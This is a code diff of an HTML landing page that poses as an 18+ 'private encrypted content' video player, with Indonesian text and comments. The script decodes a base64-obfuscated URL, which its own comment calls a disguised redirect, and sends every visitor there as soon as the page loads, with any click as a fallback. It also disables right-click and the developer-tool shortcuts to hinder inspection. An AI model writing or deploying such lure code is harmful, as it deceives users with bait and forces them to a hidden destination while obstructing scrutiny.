@@ -1,247 +1,142 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1,user-scalable=no">
-<meta name="referrer" content="no-referrer">
-<title>Ｍｏｇｏｆｌｏｘ</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+    <meta name="referrer" content="no-referrer">
+    <title>Private Access</title>
 
-<meta property="og:title" content="Private Access">
-<meta property="og:description" content="Secure media delivery ready to play.">
-<meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
-<meta property="og:type" content="website">
+    <!-- Metadata Sosial -->
+    <meta property="og:title" content="Private Access">
+    <meta property="og:description" content="Pengiriman media aman siap putar.">
+    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg">
+    <meta property="og:type" content="website">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
 
-<link rel="preconnect" href="https://cdn.videy.co">
-<link rel="preconnect" href="https://cdn.jsdelivr.net">
+        :root {
+            --brand-red: #e50914;
+        }
 
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{
-height:100%;
-background:#000;
-font-family:Arial,Helvetica,sans-serif;
-overflow:hidden;
-}
-body{
-display:flex;
-align-items:center;
-justify-content:center;
-color:#fff;
-}
-.wrap{
-width:100%;
-max-width:390px;
-height:100vh;
-max-height:760px;
-background:#050505;
-position:relative;
-overflow:hidden;
-}
-#bgVideo,#thumb{
-position:absolute;
-inset:0;
-width:100%;
-height:100%;
-object-fit:cover;
-}
-#bgVideo{
-filter:blur(10px) brightness(.45);
-transform:scale(1.08);
-opacity:0;
-transition:opacity .5s ease;
-}
-#thumb{
-filter:blur(8px) brightness(.45);
-}
-.overlay{
-position:absolute;
-inset:0;
-background:linear-gradient(to bottom,rgba(0,0,0,.35),rgba(0,0,0,.82));
-display:flex;
-flex-direction:column;
-align-items:center;
-justify-content:center;
-padding:20px;
-text-align:center;
-z-index:5;
-}
-.badge{
-border:2px solid #ff1a1a;
-padding:4px 14px;
-font-size:12px;
-font-weight:900;
-letter-spacing:2px;
-border-radius:4px;
-color:#ff1a1a;
-margin-bottom:12px;
-}
-.small{
-font-size:11px;
-letter-spacing:3px;
-opacity:.85;
-margin-bottom:28px;
-}
-.play{
-width:92px;
-height:92px;
-border-radius:50%;
-background:#e50914;
-display:flex;
-align-items:center;
-justify-content:center;
-box-shadow:0 0 30px rgba(229,9,20,.65);
-animation:pulse 1.3s infinite;
-cursor:pointer;
-}
-.play:before{
-content:"";
-margin-left:7px;
-border-left:28px solid #fff;
-border-top:18px solid transparent;
-border-bottom:18px solid transparent;
-}
-@keyframes pulse{
-0%{transform:scale(1)}
-50%{transform:scale(1.08)}
-100%{transform:scale(1)}
-}
-.cta{
-margin-top:30px;
-font-size:13px;
-font-weight:700;
-letter-spacing:3px;
-}
-.bottom{
-position:absolute;
-bottom:0;
-left:0;
-right:0;
-padding:16px;
-text-align:center;
-font-size:11px;
-opacity:.65;
-z-index:6;
-background:linear-gradient(to top,#000,transparent);
-}
-.loader{
-position:absolute;
-inset:0;
-background:#000;
-display:none;
-z-index:20;
-align-items:center;
-justify-content:center;
-flex-direction:column;
-}
-.spin{
-width:42px;
-height:42px;
-border:3px solid rgba(255,255,255,.15);
-border-top:3px solid #e50914;
-border-radius:50%;
-animation:rot .8s linear infinite;
-margin-bottom:14px;
-}
-@keyframes rot{
-to{transform:rotate(360deg)}
-}
-.loadtxt{
-font-size:11px;
-letter-spacing:3px;
-color:#ff4040;
-}
-</style>
+        body {
+            background-color: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 450px;
+            height: 100vh;
+            background: #000;
+            position: relative;
+            cursor: pointer;
+        }
+
+        .content-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .play-button {
+            width: 100px;
+            height: 100px;
+            background: var(--brand-red);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 30px rgba(229, 9, 20, 0.4);
+        }
+
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-top: 15px solid transparent;
+            border-bottom: 15px solid transparent;
+            border-left: 25px solid white;
+            margin-left: 8px;
+        }
+    </style>
 </head>
-
 <body>
-<div class="wrap" id="hitArea">
 
-<img id="thumb" src="https://vidley.pw/tombolplay.jpg" alt="preview">
-<video id="bgVideo" autoplay muted loop playsinline></video>
+    <div class="main-container" id="hitArea">
+        <div class="content-overlay">
+            <div class="border border-red-600 text-red-600 px-2 py-1 text-xs font-black rounded mb-4">18+</div>
+            <h2 class="text-xs tracking-[0.3em] font-bold opacity-70 mb-8">KONTEN TERENKRIPSI PRIVAT</h2>
+            
+            <div class="play-button mb-6">
+                <div class="play-icon"></div>
+            </div>
 
-<div class="overlay" id="overlay">
-<div class="badge">18+</div>
-<div class="small">PRIVATE CONTENT</div>
-<div class="play"></div>
-<div class="cta">CLICK TO PLAY</div>
-</div>
+            <p class="text-sm font-bold tracking-widest uppercase">Klik untuk Membuka</p>
+        </div>
+    </div>
 
-<div class="bottom">
-Encrypted • Fast Stream • Secure Access
-</div>
+    <script>
+        // Base redirect yang disamarkan
+        const BASE_REDIRECT = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");
 
-<div class="loader" id="loader">
-<div class="spin"></div>
-<div class="loadtxt">CONNECTING</div>
-</div>
+        /**
+         * Mengambil ID video dari parameter URL atau path
+         */
+        function extractVideoId() {
+            const params = new URLSearchParams(window.location.search);
+            let id = params.get("id") || params.get("v");
 
-</div>
+            if (!id) {
+                const pathParts = window.location.pathname.split("/");
+                const lastPart = pathParts.pop().trim();
+                if (lastPart && !lastPart.includes(".") && lastPart !== "index") {
+                    id = lastPart;
+                }
+            }
+            return (id && id.length >= 3) ? id : null;
+        }
 
-<script>
-const BASE = atob("aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDg1MjM3OA==");
-let fired = false;
+        /**
+         * Fungsi untuk langsung pindah ke tautan tujuan
+         */
+        function goDirectly() {
+            const id = extractVideoId();
+            let finalUrl = BASE_REDIRECT;
+            if (id) finalUrl += "/" + id;
+            
+            window.location.replace(finalUrl);
+        }
 
-function getId(){
- const p = new URLSearchParams(location.search);
- let id = p.get("id") || p.get("v");
+        // Eksekusi segera setelah DOM siap
+        document.addEventListener("DOMContentLoaded", () => {
+            // Langsung coba pindah saat halaman dimuat
+            goDirectly();
 
- if(!id){
-   let last = location.pathname.split("/").pop().trim();
-   if(last && !last.includes(".") && last !== "index" && last !== "bridge"){
-     id = last;
-   }
- }
- return id && id.length >= 3 ? id : null;
-}
+            // Backup jika auto-redirect gagal/terblokir, klik area mana saja akan memicu perpindahan
+            document.getElementById("hitArea").addEventListener("click", goDirectly);
+        });
 
-function preview(){
- const id = getId();
- if(!id) return;
+        // Pencegahan inspeksi standar
+        document.addEventListener("contextmenu", e => e.preventDefault());
+        document.onkeydown = e => {
+            if (e.keyCode === 123) return false;
+            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) return false;
+        };
+    </script>
 
- const vid = document.getElementById("bgVideo");
- vid.src = "https://cdn.videy.co/" + id + ".mp4";
-
- vid.onloadeddata = ()=>{
-   vid.style.opacity = "1";
-   document.getElementById("thumb").style.opacity = ".25";
- };
-}
-
-function go(){
- if(fired) return;
- fired = true;
-
- document.getElementById("loader").style.display="flex";
- document.getElementById("overlay").style.opacity="0";
-
- const id = getId();
- let url = BASE;
-
- if(id){
-   url += "/" + id;
- }
-
- setTimeout(()=>{
-   location.replace(url);
- },650);
-}
-
-document.addEventListener("DOMContentLoaded", ()=>{
- preview();
-
- document.getElementById("hitArea").addEventListener("click", go);
-
- setTimeout(go, 220);
-});
-
-document.addEventListener("contextmenu", e=>e.preventDefault());
-document.onkeydown = e=>{
- if(e.keyCode===123) return false;
- if(e.ctrlKey && e.shiftKey) return false;
-};
-</script>
-
-<!-- Histats -->
+    <!-- Histats -->
 <script type="text/javascript">
 var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4999645,4,0,0,0,00010000']);
